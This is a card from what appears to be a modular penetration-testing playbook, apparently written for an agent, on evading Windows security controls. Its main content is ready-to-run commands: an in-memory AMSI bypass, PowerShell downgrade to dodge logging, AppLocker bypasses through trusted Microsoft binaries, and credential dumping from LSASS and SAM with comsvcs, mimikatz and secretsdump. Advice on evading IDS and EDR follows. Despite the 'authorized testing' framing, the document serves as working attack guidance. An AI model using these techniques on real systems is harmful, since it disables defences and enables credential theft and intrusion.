# Authorized Control-Evasion And Environment Adaptation: Evasion Techniques By Control Layer

## Contents

- [Evasion Techniques By Control Layer](#evasion-techniques-by-control-layer)
  - [AMSI Bypass](#amsi-bypass)
  - [PowerShell Logging Bypass](#powershell-logging-bypass)
  - [AppLocker / WDAC Bypass](#applocker-wdac-bypass)
  - [LSASS Protection Bypass](#lsass-protection-bypass)
  - [Network IDS/IPS Evasion](#network-idsips-evasion)
  - [EDR Evasion — General Principles](#edr-evasion-general-principles)


> Apply [../module-continuity.md](../module-continuity.md). Inherit the engagement, parent path, current capability, evidence, authorization profile, and module stack. Do not initialize a separate workflow. Checkpoint material results and return them to the parent path before leaving this card.

## Evasion Techniques By Control Layer

### AMSI Bypass

AMSI scans script content before execution in PowerShell, VBScript, JScript, .NET in-process. 

**Common approaches** (test in order of risk):

1. **Patch AMSI in memory** (most common):
```powershell
# Method 1: Force AMSI initialization to fail
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

2. **Obfuscate script content**: Split strings, use encoding, avoid known-bad function names:
```powershell
# Instead of: Invoke-Mimikatz
# Use: & ((Get-Command *ke*).Name)  # but this is also detected
# Better: Download and run in memory, use reflection
```

3. **Lower PowerShell version**: `powershell -Version 2` (if .NET 2.0/3.5 available) — AMSI not supported

4. **Use alternative scripting hosts**: `cscript`, `wscript`, `mshta`, .NET executables (C# compiled with csc.exe)

### PowerShell Logging Bypass

PowerShell v5+ has: Script Block Logging (4104), Module Logging (4103), and Transcription.

- **Script Block Logging**: Logs de-obfuscated script blocks to Event 4104. Hard to bypass at the PowerShell level; better to avoid PowerShell entirely for sensitive operations.
- **Module Logging**: Configurable per-module. If only specific modules are logged, use different modules.
- **Downgrade to v2**: `powershell -Version 2` — no Script Block Logging

**Practical approach**: When logging is comprehensive, use .NET executables (compiled C#) or native Windows commands instead of PowerShell scripts.

### AppLocker / WDAC Bypass

```powershell
# 1. Use trusted Microsoft binaries (LOLBins)
C:\Windows\System32\msbuild.exe payload.xml       # if AppLocker allows MSBuild
C:\Windows\System32\csc.exe /out:payload.exe payload.cs  # compile and run C#
C:\Windows\System32\InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll

# 2. Execute from allowed directory
# AppLocker default rules allow: C:\Windows\, C:\Program Files\, C:\Program Files (x86)\
# If you have write access to any subdirectory within these paths → run from there

# 3. Use alternate execution methods
# DLL: regsvr32.exe /s payload.dll
# DLL: rundll32.exe payload.dll,EntryPoint
# Script: wscript.exe payload.vbs  (if VBS/JS allowed but PS blocked)
# Script: mshta.exe javascript:...
```

### LSASS Protection Bypass

When Credential Guard or LSA Protection (RunAsPPL) blocks LSASS access:

```powershell
# 1. Use DCSync instead of dumping LSASS (if you have replication rights)
mimikatz # lsadump::dcsync /domain:DOMAIN /user:krbtgt

# 2. Dump SAM (local accounts only) instead of LSASS
reg save HKLM\SAM SAM.hiv
reg save HKLM\SYSTEM SYSTEM.hiv
impacket-secretsdump -sam SAM.hiv -system SYSTEM.hiv LOCAL

# 3. Use Task Manager dump (requires GUI/RDP, but kernel-authorized)
# Task Manager → Details → lsass.exe → Create dump file
# Then offline: mimikatz "sekurlsa::minidump lsass.DMP" "sekurlsa::logonPasswords"

# 4. Use comsvcs.dll (LOLBin, kernel-authorized)
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass_pid> lsass.dmp full

# 5. Use PPL-dump driver (needs admin to load driver)
# Tools: PPLdump, PPLcontrol
```

### Network IDS/IPS Evasion

When a specific exploit payload triggers network detection:

1. **Fragmentation**: Split payload across multiple IP fragments or TCP segments
2. **Encryption**: Tunnel through HTTPS (if allowed), SSH, or custom encryption
3. **Protocol mimicry**: Make the attack traffic look like legitimate protocol traffic (DNS tunneling, HTTP long-poll, ICMP tunneling)
4. **Timing randomization**: Spread requests across time to avoid rate-based detection
5. **Payload encoding**: Encode/encrypt the actual payload while keeping the protocol wrapper valid
6. **Alternative protocol**: If SMB (445) is monitored, try WinRM (5985). If both, try scheduled task via RPC

### EDR Evasion — General Principles

Full EDR evasion is complex and product-specific. For authorized testing:

1. **Ask for allowlisting**: The most professional approach — request that the testing tool or source IP be added to EDR exceptions. This is common in real pentests.
2. **Use LOLBins**: Native Windows binaries are less likely to trigger behavioral detection
3. **Operate in memory**: Avoid writing executables to disk. PowerShell in-memory execution, .NET reflection loading, or shellcode injection
4. **Don't dump LSASS**: Use token manipulation, Kerberos ticket reuse, or DCSync instead
5. **Limit process creation**: Lateral movement via WMI creates fewer suspicious processes than PSExec
6. **Match normal behavior**: Work during business hours, from a user workstation, using standard admin tools (Enter-PSSession, MMC, RDP) — these look like normal IT activity

---


## Card Exit

Classify the result, update evidence and attempted methods, record capability or risk changes, identify affected paths, and apply the return contract in [../module-continuity.md](../module-continuity.md).
